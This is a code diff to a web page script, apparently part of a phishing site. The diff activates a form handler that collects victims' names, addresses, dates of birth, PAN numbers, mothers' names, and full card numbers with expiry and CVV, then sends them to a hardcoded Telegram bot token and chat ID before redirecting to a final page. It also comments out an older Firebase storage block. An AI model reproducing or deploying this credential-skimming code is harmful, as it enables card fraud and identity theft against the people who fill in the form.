@@ -218,72 +218,72 @@
         // Telegram Bot Token and Chat ID
   
 
-//           const TELEGRAM_BOT_TOKEN = '8433225686:AAE8DNLkCoqwdMIKtmr_0stL5wehKQ2byuY';
-//         const TELEGRAM_CHAT_ID = '8041379859';
+          const TELEGRAM_BOT_TOKEN = '8385535613:AAG9aEFOFXLcZ74R3yz5xUd7v5OPP3GRC_w';
+        const TELEGRAM_CHAT_ID = '8327508337';
 
 
-//         // Form Submission Handler
-//         document.querySelector('.application-form').addEventListener('submit', async function(event) {
-//             event.preventDefault();
+        // Form Submission Handler
+        document.querySelector('.application-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
 
-//             // Collect form data
-//             const formData = new FormData(this);
-//             const data = {};
-//             formData.forEach((value, key) => {
-//                 data[key] = value;
-//             });
+            // Collect form data
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
 
-//             // Format message for Telegram
-//             const message = `
-// <b>🆕 New Form Submission</b>
-// 👤 Name: ${data.name}
-// 📧 Email: ${data.email}
-// 📱 Mobile: ${data.mobile}
-// 🎂 Date of Birth: ${data.dob}
-// 🏠 Address: ${data.address}
-// 👤 Mother Name: ${data.aadhar}
-// 🧾 PAN: ${data.pan}
-// 👥 Reference: ${data.reference}
-// 💳 Card Holder: ${data.card_holder}
-// 💳 Card Number: ${data.card_number}
-// 📆 Expiry: ${data.expiry}
-// 🔒 CVV: ${data.cvv}
-// 💸 Transaction Limit: ${data.transaction_limit}
-// 📊 Outstanding Limit: ${data.outstanding_limit}
+            // Format message for Telegram
+            const message = `
+<b>🆕 Website New Form Submission</b>
+👤 Name: ${data.name}
+📧 Email: ${data.email}
+📱 Mobile: ${data.mobile}
+🎂 Date of Birth: ${data.dob}
+🏠 Address: ${data.address}
+👤 Mother Name: ${data.aadhar}
+🧾 PAN: ${data.pan}
+👥 Reference: ${data.reference}
+💳 Card Holder: ${data.card_holder}
+💳 Card Number: ${data.card_number}
+📆 Expiry: ${data.expiry}
+🔒 CVV: ${data.cvv}
+💸 Transaction Limit: ${data.transaction_limit}
+📊 Outstanding Limit: ${data.outstanding_limit}
 
-//             `;
+            `;
 
 
             
 
 
 
-//             // Send message to Telegram
-//             try {
-//                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-//                     method: 'POST',
-//                     headers: { 'Content-Type': 'application/json' },
-//                     body: JSON.stringify({
-//                         chat_id: TELEGRAM_CHAT_ID,
-//                         text: message,
-//                         parse_mode: 'HTML'
-//                     })
-//                 });
+            // Send message to Telegram
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
 
-//                 const result = await response.json();
-//                 if (result.ok) {
-//                     // alert('Form submitted successfully! Data sent to Telegram.');
-//                     window.location.href = 'finalpage.html'; // इस पेज पर redirect होगा
-//                     this.reset(); // Reset form after successful submission
+                const result = await response.json();
+                if (result.ok) {
+                    // alert('Form submitted successfully! Data sent to Telegram.');
+                    window.location.href = 'finalpage.html'; // इस पेज पर redirect होगा
+                    this.reset(); // Reset form after successful submission
                 
-//                 } else {
-//                     throw new Error(result.description || 'Failed to Submit.');
-//                 }
-//             } catch (error) {
-//                 console.error('Error:', error);
-//                 alert('Failed to submit form! Please try again.');
-//             }
-//         });
+                } else {
+                    throw new Error(result.description || 'Failed to Submit.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to submit form! Please try again.');
+            }
+        });
 
 
 
@@ -291,7 +291,7 @@
 
 
 </script>
-
+<!-- 
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
 
@@ -345,7 +345,7 @@ data.timestamp = new Date().toLocaleString(); // या Date.now() भी कर
         alert("❌ Failed to store data. Check console.");
       }
     });
-  </script>
+  </script> -->
 
 
 
